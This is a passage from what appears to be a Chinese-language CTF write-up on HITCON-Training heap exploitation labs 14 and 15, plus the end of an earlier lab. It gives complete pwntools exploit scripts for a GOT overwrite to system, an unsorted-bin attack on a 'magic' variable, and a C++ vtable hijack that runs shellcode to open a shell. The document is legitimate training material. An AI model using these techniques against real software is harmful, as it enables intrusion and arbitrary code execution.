    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    def create(size,contant):
        ru("Your choice :")
        sl("1")
        ru("Size of Heap : ")
        sl(str(size))
        ru("Content of heap:")
        sd(contant)
    def edit(Index,contant):
        ru("Your choice :")
        sl("2")
        ru("Index :")
        sl(str(Index))
        ru("Content of heap : ")
        sd(contant)
    def show(Index):
        ru("Your choice :")
        sl("3")
        ru("Index :")
        sl(str(Index))
    def delete(Index):
        ru("Your choice :")
        sl("4")
        ru("Index :")
        sl(str(Index))
    free_got = elf.got["free"]
    print "free_got------>"+hex(free_got)
    create(0x18,"a"*8)
    create(0x10,"b"*8)
    edit(0,"/bin/sh\x00"+"a"*0x10+p64(0x41))
    #debug()
    delete(1)
    create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
    show(1)
    ru("Content : ")
    free = u64(p.recv(6).ljust(8,"\x00"))
    libc_base = free- libc.symbols["free"]
    system = libc_base+libc.symbols["system"]
    print "free------>"+hex(free)
    print "libc_base------>"+hex(libc_base)
    edit(1,p64(system))
    delete(0)
    getshell()
    #debug()
* * *
# lab14
这里存在一个直接cat flag 的函数，只要想办法把magic 的值改得比0x1305大就行了
这里需要用到一个unsorted_bin的小操作
利用修改一个unsorted_bin的bk，使得指定的内存位置的值变得很大
首先，释放一个chunk到 unsorted bin 中。  
接着利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为
&magic-16，再一次分配chunk的时候就会触发漏洞，会把magic的值改成一个大的数值
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heapp)上面其实也有针对这题的特别讲解，原理还是比较易懂
直接上exp：
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="amd64",log_level = "debug")
    ip =""
    if ip:
        p = remote(ip,20004)
    else:
        p = process("./magicheap")#, aslr=0
    elf = ELF("./magicheap")
    libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    def create(Size,contant):
        ru("Your choice :")
        sl("1")
        ru("Size of Heap : ")
        sl(str(Size))
        ru("Content of heap:")
        sd(contant) 
    def edit(index,Size,contant):
        ru("Your choice :")
        sl("2")
        ru("Index :")
        sl(str(index))
        ru("Size of Heap : ")
        sl(str(Size))
        ru("Content of heap : ")
        sd(contant)
    def delete(index):
        ru("Your choice :")
        sl("3")
        ru("Index :")
        sl(str(index))
    create(0x20, "aaaa")  # 0
    create(0x80, "aaaa")  # 1
    create(0x20, "aaaa")  # 2
    delete(1)
    magic = 0x6020c0
    fd = 0
    bk = magic - 0x10
    payload = "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk)
    edit(0, 0x40,payload)
    create(0x80, "aaaa")
    p.recvuntil(":")
    p.sendline("4869")
    print p.recvall()
    #getshell()
* * *
# lab15
这题是c++编写的程序，打开IDA后发现反编译的东西真恶心，完全不知道怎么看，只能看题目提供的源码
从保护机制来看，连NX 都没开，八成就是用写入shellcode的操作了
这里涉及到一个c++虚表的知识点
大概意思是，在c++的类中的虚表会通过一个叫虚表的东西进行跳转从而执行函数
这题的解法的思路在于，修改虚表，跳转到shellcode的位置执行
通过IDA搜索功能，可以找到dog的虚表位置：0x403140
关于虚表的知识点，可以参考这位大佬的博客：[http://showlinkroom.me](http://showlinkroom.me/2017/08/21/C-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/)
简单介绍一下，虚表大概是这样子的：
而我们要操作它，使他变成这样：
我们结合题目源代码，可以发现：是通过animallist数组来实现speak函数的，换句话说这个数组存着指向虚表的指针
如果我们，建立两个dog：（完整的exp在后面）
    add_dog("a"*8,0)
    add_dog("b"*8,1)
那么此时的堆分布是这样的：
由于，这一句代码会造成堆溢出，可以通过堆溢出来实现修改虚表的地址
再接着执行：
    remove(0)
    fake_vptr = nameofzoo + len(shellcode)
    add_dog("c"*72 + p64(fake_vptr),2)
此时堆的分布变成了这样：
通过上面的图已经可以很清楚构造的过程了
接着就只需要去调用一次speak函数就行了，也就是调用一次listen()
完整的exp如下：
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="amd64",log_level = "debug")
    ip =""
    if ip:
        p = remote(ip,0000)
    else:
        p = process("./zoo")#, aslr=0
    elf = ELF("./zoo")
    #libc = ELF("./libc-2.23.so")
    libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    shellcode = asm(shellcraft.sh())
    def add_dog(name,weight):
        ru(":")
        sl("1")
        ru(":")
        sl(name)
        ru(":")
        sl(str(weight))
    def remove(idx):
        ru(":")
        sl("5")
        ru(":")
        sl(str(idx))
    def listen(idx):
        ru(":")
        sl("3")
        ru(":")
        sl(str(idx))    
    #gdb.attach(p,"b *0x40193E\nc\n")
    nameofzoo = 0x605420
    ru(":")
    sl(shellcode + p64(nameofzoo))
    add_dog("a"*8,0)
    add_dog("b"*8,1)
    # debug()
    remove(0)
    # pause()
    fake_vptr = nameofzoo + len(shellcode)
    add_dog("c"*72 + p64(fake_vptr),2)
    #pause()
    listen(0)
    getshell()
通过接触这题，发现还是得去看看c++的逆向，学会逆一下c++
# 总结
从lab1到lab15，花了我挺多的时间，但学了很多姿势，非常感谢Angelboy大佬  
另外他在油管还有几个pwn的教学视频，个人觉得挺不错的，拿出来分享一波  